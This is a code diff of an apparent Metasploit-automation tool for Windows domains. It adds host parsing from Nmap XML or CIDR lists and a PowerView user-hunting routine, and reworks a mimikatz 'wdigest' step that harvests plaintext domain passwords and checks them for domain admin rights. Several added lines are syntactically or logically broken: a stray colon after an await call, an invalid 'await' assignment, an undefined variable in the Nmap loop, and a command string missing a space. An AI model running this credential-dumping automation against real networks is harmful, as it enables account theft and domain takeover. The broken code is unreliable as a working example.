@@ -20,12 +20,14 @@ DOMAIN_DATA = {'domain':None,
                'domain_controllers':[], 
                'high_priority_ips':[], 
                'creds':[],
+               'IPs_in_scope':[],
                'checked_hosts':[]}
 
 def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--hostlist", help="Host list file")
+    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
     parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
     parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
     return parser.parse_args()
@@ -388,54 +390,88 @@ def update_session(session, sess_num):
         if b'errors' not in NEW_SESS_DATA[sess_num]:
             NEW_SESS_DATA[sess_num][b'errors'] = []
 
+async def run_userhunter(client, sess_num):
+    plugin = 'powershell'
+    output, err = await load_met_plugin(client, sess_num, plugin)
+    if err:
+        return
+
+    script_path = os.getcwd()+'/scripts/powerview.ps1'
+    output, err = await import_powershell(client, sess_num, script_path)
+    if err:
+        return
+
+    ps_cmd = 'Find-DomainUser'
+    output, err = await run_powershell_cmd(client, sess_num, ps_cmd):
+    if err:
+        return
+
+async def import_powershell(client, sess_num, script_path):
+    cmd = 'powershell_import '+ script_path
+    end_strs = [b'File successfully imported.']
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
+    return (output, err)
+
+async def run_powershell_cmd(client, sess_num, ps_cmd):
+    cmd = 'powershell_execute'+ ps_cmd
+    end_strs = [b'Command execution completed:']
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
+    return (output, err)
+
+async def load_met_plugin(client, sess_num, plugin):
+    cmd = 'load '+plugin
+    end_strs = [b'Success.', b'has already been loaded.']
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
+    return (output, err)
+
 async def run_mimikatz(client, sess_num):
     global DOMAIN_DATA
 
-    cmd = 'load mimikatz'
-    end_strs = [b'Success.', b'has already been loaded.']
-    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
+    plugin = 'mimikatz'
+    await output, err = load_met_plugin(client, sess_num, plugin)
     if err:
         return
+
     cmd = 'wdigest'
     end_strs = [b'    Password']
     output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
     if err:
         return 
-    else:
-        mimikatz_split = output.splitlines()
-        for l in mimikatz_split:
 
-            if l.startswith(b'0;'):
-                line_split = l.split(None, 4)
+    mimikatz_split = output.splitlines()
+    for l in mimikatz_split:
 
-                # Output may include accounts without a password?
-                # Here's what I've seen that causes problems:
-                #ob'AuthID        Package    Domain        User               Password'
-                #b'------        -------    ------        ----               --------'
-                #b'0;1299212671  Negotiate  IIS APPPOOL   DefaultAppPool     '
-                #b'0;995         Negotiate  NT AUTHORITY  IUSR               '
-                #b'0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE      '
-                #b'0;41167       NTLM                                        '
+        if l.startswith(b'0;'):
+            line_split = l.split(None, 4)
 
-                if len(line_split) < 5:
+            # Output may include accounts without a password?
+            # Here's what I've seen that causes problems:
+            #ob'AuthID        Package    Domain        User               Password'
+            #b'------        -------    ------        ----               --------'
+            #b'0;1299212671  Negotiate  IIS APPPOOL   DefaultAppPool     '
+            #b'0;995         Negotiate  NT AUTHORITY  IUSR               '
+            #b'0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE      '
+            #b'0;41167       NTLM                                        '
+
+            if len(line_split) < 5:
+                continue
+
+            dom = line_split[2]
+            if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
+                dom_user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
+                password = line_split[4]
+
+                # Check if it's just some hex shit that we can't use
+                if password.count(b' ') > 200:
                     continue
 
-                dom = line_split[2]
-                if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
-                    dom_user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
-                    password = line_split[4]
-
-                    # Check if it's just some hex shit that we can't use
-                    if password.count(b' ') > 200:
-                        continue
-
-                    if b'wdigest KO' not in password:
-                        creds = '{}:{}'.format(dom_user, password.decode('utf8'))
-                        if creds not in DOMAIN_DATA['creds']:
-                            DOMAIN_DATA['creds'].append(creds)
-                            msg = 'Creds found through Mimikatz: '+creds
-                            print_great(msg, sess_num)
-                            await check_for_DA(creds)
+                if b'wdigest KO' not in password:
+                    creds = '{}:{}'.format(dom_user, password.decode('utf8'))
+                    if creds not in DOMAIN_DATA['creds']:
+                        DOMAIN_DATA['creds'].append(creds)
+                        msg = 'Creds found through Mimikatz: '+creds
+                        print_great(msg, sess_num)
+                        await check_for_DA(creds)
 
 async def check_creds_against_DC(client, sess_num, creds, plaintext):
     cred_split = creds.split(':')
@@ -747,7 +783,47 @@ async def check_for_sessions(client, loop):
 
         await asyncio.sleep(1)
 
+def parse_hostlist(args):
+    global DOMAIN_DATA
+
+    hosts = []
+
+    if args.xml:
+        try:
+            report = NmapParser.parse_fromfile(args.xml)
+            for host in report.hosts:
+                if host.is_up():
+                    if s.port == 445:
+                        if s.state == 'open':
+                            if host not in hosts:
+                                hosts.append(host)
+        except FileNotFoundError:
+            print_bad('Host file not found: {}'.format(args.xml))
+            sys.exit()
+
+    elif args.hostlist:
+        with open(args.hostlist, 'r') as hostlist:
+            host_lines = hostlist.readlines()
+            for line in host_lines:
+                line = line.strip()
+                try:
+                    if '/' in line:
+                        hosts += [str(ip) for ip in IPNetwork(line)]
+                    elif '*' in line:
+                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
+                        sys.exit()
+                    else:
+                        hosts.append(line)
+                except (OSError, AddrFormatError):
+                    print_bad('Error importing host list file. Are you sure you chose the right file?')
+                    sys.exit()
+
+    DOMAIN_DATA['IPs_in_scope'] = hosts
+
 def main(args):
+
+    if args.hostlist or args.xml:
+        parse_hostlist(args)
 
     client = msfrpc.Msfrpc({})
     client = get_perm_token(client)
